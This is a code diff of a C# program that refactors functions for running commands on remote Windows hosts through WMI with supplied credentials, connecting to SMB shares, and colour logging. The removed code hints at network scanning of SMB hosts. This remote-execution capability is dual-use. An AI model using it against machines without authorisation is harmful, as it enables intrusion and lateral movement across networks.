-                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
-                ?.ToString();
+            // Use a 'using' statement to ensure the socket is properly disposed of.
+            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
+            {
+                // First, connect the socket. This method returns void.
+                socket.Connect("8.8.8.8", 65530);
+
+                // Now that it's connected, get the endpoint from the original socket object.
+                return socket.LocalEndPoint.ToString().Split(':')[0];
+            }
         }
         catch
         {
@@ -807,45 +443,22 @@ class Program
         }
     }
 
-    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute, string componentName)
+    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
     {
         try
         {
-            ConnectionOptions connOpts = new ConnectionOptions
-            {
-                Username = username,
-                Password = password,
-                Impersonation = ImpersonationLevel.Impersonate,
-                Authentication = AuthenticationLevel.Default,
-                EnablePrivileges = true,
-                Timeout = TimeSpan.FromSeconds(30)
-            };
-
-            string path = $"\\\\{remoteIp}\\root\\cimv2";
-            var scope = new ManagementScope(path, connOpts);
+            var connOpts = new ConnectionOptions { Username = username, Password = password, Impersonation = ImpersonationLevel.Impersonate, EnablePrivileges = true, Timeout = TimeSpan.FromSeconds(30) };
+            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
             scope.Connect();
-
-            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
+            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
             {
                 var inParams = processClass.GetMethodParameters("Create");
                 inParams["CommandLine"] = commandToExecute;
-
                 var outParams = processClass.InvokeMethod("Create", inParams, null);
-
-                if (outParams != null)
-                {
-                    var returnCode = Convert.ToInt32(outParams["returnValue"]);
-
-                    if (returnCode == 0 || returnCode == 2)
-                    {
-                        return true;
-                    }
-                }
+                return outParams != null && (Convert.ToInt32(outParams["returnValue"]) == 0 || Convert.ToInt32(outParams["returnValue"]) == 2);
             }
         }
-        catch { }
-
-        return false;
+        catch { return false; }
     }
 
     [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
@@ -856,88 +469,43 @@ class Program
 
     private static int ConnectToRemoteShare(string remotePath, string username, string password)
     {
-        var nr = new NETRESOURCE
-        {
-            dwType = 1,
-            lpRemoteName = remotePath
-        };
+        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = remotePath };
         return WNetAddConnection2(ref nr, password, username, 0);
     }
 
     private static void DisconnectFromRemoteShare(string remotePath)
     {
-        try
-        {
-            WNetCancelConnection2(remotePath, 0, true);
-        }
-        catch { }
+        try { WNetCancelConnection2(remotePath, 0, true); } catch { }
     }
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct NETRESOURCE
     {
-        public int dwScope;
-        public int dwType;
-        public int dwDisplayType;
-        public int dwUsage;
-        public string lpLocalName;
-        public string lpRemoteName;
-        public string lpComment;
-        public string lpProvider;
+        public int dwScope; public int dwType; public int dwDisplayType; public int dwUsage;
+        public string lpLocalName; public string lpRemoteName; public string lpComment; public string lpProvider;
     }
 
-    private static void LogInfo(string message)
+    private static void Log(string message, ConsoleColor color)
     {
-        string logMessage = $"[INFO] {message}";
-        Console.ForegroundColor = ConsoleColor.Cyan;
+        string logMessage = $"[{color.ToString().ToUpper()}] {message}";
+        Console.ForegroundColor = color;
         Console.WriteLine(logMessage);
         Console.ResetColor();
         LogToFile(logMessage);
     }
-
-    private static void LogSuccess(string message)
-    {
-        string logMessage = $"[SUCCESS] {message}";
-        Console.ForegroundColor = ConsoleColor.Green;
-        Console.WriteLine(logMessage);
-        Console.ResetColor();
-        LogToFile(logMessage);
-    }
-
-    private static void LogWarning(string message)
-    {
-        string logMessage = $"[WARNING] {message}";
-        Console.ForegroundColor = ConsoleColor.Yellow;
-        Console.WriteLine(logMessage);
-        Console.ResetColor();
-        LogToFile(logMessage);
-    }
-
-    private static void LogError(string message)
-    {
-        string logMessage = $"[ERROR] {message}";
-        Console.ForegroundColor = ConsoleColor.Red;
-        Console.WriteLine(logMessage);
-        Console.ResetColor();
-        LogToFile(logMessage);
-    }
-
+    private static void LogInfo(string message) => Log(message, ConsoleColor.Cyan);
+    private static void LogSuccess(string message) => Log(message, ConsoleColor.Green);
+    private static void LogWarning(string message) => Log(message, ConsoleColor.Yellow);
+    private static void LogError(string message) => Log(message, ConsoleColor.Red);
     private static void LogToFile(string message)
     {
-        try
-        {
-            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-            string logEntry = $"[{timestamp}] {message}";
-            File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
-        }
-        catch { }
+        try { File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}"); } catch { }
     }
 
     private static string GetWNetErrorDescription(int errorCode)
     {
         switch (errorCode)
         {
-            case 0: return "Success";
             case 5: return "Access is denied";
             case 53: return "The network path was not found";
             case 86: return "The specified network password is not correct";
@@ -945,11 +513,5 @@ class Program
             case 1326: return "Logon failure: unknown user name or bad password";
             default: return $"Error code {errorCode}";
         }
-    }
-
-    private struct ScanProgress
-    {
-        public int Completed { get; set; }
-        public int ActiveSmb { get; set; }
     }
 }
